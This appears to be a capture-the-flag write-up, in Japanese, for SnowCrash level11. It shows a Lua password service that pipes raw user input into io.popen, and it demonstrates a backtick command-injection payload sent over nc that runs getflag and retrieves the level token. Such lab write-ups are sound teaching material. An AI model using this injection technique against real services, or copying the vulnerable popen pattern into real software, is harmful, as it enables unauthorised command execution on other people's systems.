```sh
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

io.popenを使用してシステムコマンドを実行していますが、ユーザー入力をそのまま使用しているため、コマンドインジェクション攻撃に脆弱。

ここの部分のPassの部分にコマンドをいれて実行できる
  prog = io.popen("echo "..pass.." | sha1sum", "r")

```sh
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag` > /tmp/test
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

